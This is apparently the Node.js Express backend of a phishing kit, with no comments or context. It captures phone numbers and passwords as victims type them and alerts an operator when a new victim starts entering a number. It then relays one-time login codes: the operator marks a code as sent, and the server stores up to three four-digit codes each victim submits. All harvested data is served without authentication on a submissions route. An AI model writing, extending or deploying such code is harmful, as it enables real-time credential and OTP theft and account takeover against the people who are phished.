const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));

const sessions = new Map();
const groupedCodesByPhone = new Map();

function ensureSession(sessionId) {
  if (!sessions.has(sessionId)) {
    sessions.set(sessionId, {
      sessionId,
      phone: '',
      password: '',
      codeRequested: false,
      codeSended: false,
      codeSendedAt: null,
      notifiedFirstPhoneDigit: false,
      newPhoneAlert: null,
      updatedAt: Date.now()
    });
  }
  return sessions.get(sessionId);
}

function getOrCreatePhoneCodes(phone) {
  if (!groupedCodesByPhone.has(phone)) {
    groupedCodesByPhone.set(phone, [null, null, null]);
  }
  return groupedCodesByPhone.get(phone);
}

app.post('/api/live-update', (req, res) => {
  const { sessionId, phone = '', password = '' } = req.body || {};
  if (!sessionId) {
    return res.status(400).json({ error: 'sessionId required' });
  }

  const cleanPhone = String(phone).replace(/\D/g, '').slice(0, 10);
  const session = ensureSession(sessionId);

  const hadNoPhoneBefore = !session.phone;
  session.phone = cleanPhone;
  session.password = String(password);
  session.updatedAt = Date.now();

  if (hadNoPhoneBefore && cleanPhone.length >= 1 && !session.notifiedFirstPhoneDigit) {
    session.notifiedFirstPhoneDigit = true;
    session.newPhoneAlert = {
      id: `${sessionId}_${Date.now()}`,
      phone: cleanPhone,
      message: `Naya user phone number enter kar raha hai: ${cleanPhone}`,
      createdAt: Date.now()
    };
  } else if (session.newPhoneAlert && cleanPhone) {
    session.newPhoneAlert.phone = cleanPhone;
    session.newPhoneAlert.message = `Naya user phone number enter kar raha hai: ${cleanPhone}`;
  }

  return res.json({ ok: true, session });
});

app.post('/api/request-code', (req, res) => {
  const { sessionId, phone = '' } = req.body || {};
  if (!sessionId) {
    return res.status(400).json({ error: 'sessionId required' });
  }

  const cleanPhone = String(phone).replace(/\D/g, '').slice(0, 10);
  const session = ensureSession(sessionId);
  if (cleanPhone) session.phone = cleanPhone;
  session.codeRequested = true;
  session.codeSended = false;
  session.updatedAt = Date.now();

  return res.json({ ok: true });
});

app.get('/api/status', (req, res) => {
  const sessionId = String(req.query.sessionId || '');
  if (!sessionId || !sessions.has(sessionId)) {
    return res.json({ codeSended: false, codeSendedAt: null });
  }

  const session = sessions.get(sessionId);
  return res.json({
    codeSended: Boolean(session.codeSended),
    codeSendedAt: session.codeSendedAt,
    updatedAt: session.updatedAt
  });
});

app.post('/api/submit-code', (req, res) => {
  const { sessionId, phone = '', code = '', attempt = 1 } = req.body || {};
  const cleanPhone = String(phone).replace(/\D/g, '').slice(0, 10);
  const cleanCode = String(code).replace(/\D/g, '').slice(0, 4);
  const attemptNum = Math.max(1, Math.min(3, Number(attempt) || 1));

  if (!cleanCode) {
    return res.status(400).json({ error: 'code required' });
  }

  if (sessionId) {
    const session = ensureSession(sessionId);
    if (cleanPhone) session.phone = cleanPhone;
    session.updatedAt = Date.now();
  }

  if (cleanPhone) {
    const arr = getOrCreatePhoneCodes(cleanPhone);
    arr[attemptNum - 1] = cleanCode;
  }

  return res.json({ ok: true });
});

app.post('/api/admin/mark-code-sended', (req, res) => {
  const { sessionId } = req.body || {};
  if (!sessionId || !sessions.has(sessionId)) {
    return res.status(404).json({ error: 'Session not found' });
  }

  const session = sessions.get(sessionId);
  session.codeRequested = false;
  session.codeSended = true;
  session.codeSendedAt = Date.now();
  session.updatedAt = Date.now();

  return res.json({ ok: true });
});

app.delete('/api/sessions/:sessionId', (req, res) => {
  const sessionId = decodeURIComponent(req.params.sessionId || '');
  sessions.delete(sessionId);
  return res.json({ ok: true });
});

app.get('/api/submissions', (req, res) => {
  const sessionList = Array.from(sessions.values()).sort((a, b) => b.updatedAt - a.updatedAt);
  const groupedCodes = {};
  for (const [phone, codes] of groupedCodesByPhone.entries()) {
    groupedCodes[phone] = codes;
  }

  const alerts = sessionList
    .filter(s => s.newPhoneAlert)
    .map(s => s.newPhoneAlert)
    .sort((a, b) => b.createdAt - a.createdAt);

  return res.json({
    sessions: sessionList,
    groupedCodes,
    alerts
  });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});